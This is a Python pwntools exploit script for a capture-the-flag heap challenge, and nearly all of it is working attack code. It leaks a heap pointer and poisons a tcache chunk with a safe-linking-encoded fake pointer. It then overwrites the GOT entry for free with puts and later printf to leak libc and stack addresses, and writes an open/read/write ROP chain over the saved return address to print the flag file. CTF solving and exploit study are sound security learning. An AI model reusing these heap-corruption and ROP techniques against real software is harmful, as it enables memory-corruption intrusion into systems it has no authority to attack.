#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*0x0000000000401b5b
                # b*0x00000000004016da
                # b*0x000000000040175c
                # b*0x000000000040189d
                # c
                # c
                # c
                # b*0x4016f4
                b*0x0000000000401843
                b*0x0000000000401b2e
                c
                c
                c
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)


def leak(idx: int) -> int:
    sla(b"Option:", b"1337")
    sla(b"What is your favourite number?", str(idx).encode("ascii"))
    p.recvuntil(b"You found a secret message: ")
    leak = int(p.recvuntil(b"\n").replace(b"\n", b"").decode("ascii"), 16)
    return leak


def write(i, payload):
    sla(b"Option: ", b"1")
    sla(b"Index: ", f"{i}".encode())
    sa(b"long!\n", payload)


def throw(i):
    sla(b"Option: ", b"3")
    sla(b"Index: ", f"{i}".encode())


def edit(i, payload):
    sla(b"Option: ", b"2")
    sla(b"Index: ", f"{i}".encode())
    sa(b"before.\n", payload)


GDB()
signature = b"a"*5 + b"\x41"
sla(b"> ", b"a"*5 + p8(0x41))

write(1, b"A"*0x20)
write(2, b"B"*0x1)
write(3, b"C"*0x20)
write(4, b"D"*0x20)
heap_addr = leak(3)
edit(1, b"a" * 0x30)

throw(4)
throw(3)
throw(2)
write(2, b"E"*0x20)

fake_chunk = p64(0) + p64(0x41)  # prev_size, next_size
secret_msg = 0x004040c0
fake_chunk += p64(secret_msg ^ (heap_addr >> 12)) + \
    p64(0x0)  # next = secret_msg
# fake-chunk replaces chunk C's metadata & next ptr
edit(2, b"E"*0x10 + fake_chunk)

write(3, b"F"*0x20)  # re-allocate chunk C
write(4, b"G"*0x20)  # target chunk allocated
fake_book = p64(0x1000) + p64(secret_msg)  # size, ptr
payload = (p64(0) * 2 +  # secret_msg
           b"by " + signature + 7 * b"\x00" +  # author_signature
           fake_book)  # books[0]
edit(4, payload)

#################
### Leak libc ###
#################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["puts"]))  # overwrites free with puts

fake_book2 = p64(0x8) + p64(exe.got["puts"])
bss_payload = payload + fake_book2
edit(1, bss_payload)
throw(2)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc leak: " + hex(libc.address))

##################
### Leak Stack ###
##################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["printf"]))  # overwrite free with puts

fake_book2 = p64(0x8) + p64(0x404100)  # size=0x8 & ptr=book[2]
bss_payload = payload + fake_book2 + b"%8$p\n\0"
# writes to secret_msg. book[1] now has ptr=book[2] & size=0x8. book[2] now equals our format string.
edit(1, bss_payload)
throw(2)  # free("%8$p\0") becomes printf("%8$p\0")

stack_leak = int(p.recv(14).decode(), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 24
info("ret: " + hex(ret))

################
##### ROP ######
################
book_start = 0x004040e0
fake_book2 = p64(0x200) + p64(ret)  # size=0x200 & ptr=saved_rip
bss_payload = payload + fake_book2 + b"./flag\0"  # dua flag vao rw_section
# writes to secret_msg. book[1] now has ptr=saved_rip & size=0x200. book[2] now equals flag path.
edit(1, bss_payload)
POP_RDI = p64(libc.address + 0x001bc021)
POP_RSI = p64(libc.address + 0x001bb317)
POP_RDX_RBX = p64(libc.address + 0x00175548)
POP_RAX = p64(libc.address + 0x001284f0)
SYSCALL = p64(libc.address + 0x00140ffb)

flag_where = book_start + 0x10 * 10  # buffer to read the flag file into
payload = flat(
    # open("/flag", 0)
    POP_RAX, 2,
    POP_RDI, book_start + 0x10 * 2,
    POP_RSI, 0,
    SYSCALL,

    # read(3, flag_where, 0x50)
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, flag_where,
    POP_RDX_RBX, 0x50, 0,
    SYSCALL,

    # write(1, flag_where, 0x50)
    POP_RAX, 1,
    POP_RDI, 1,
    SYSCALL,
    # 0x0000000000401b88
)
edit(2, payload)
# sla(b"Option:", b"4")
p.interactive()
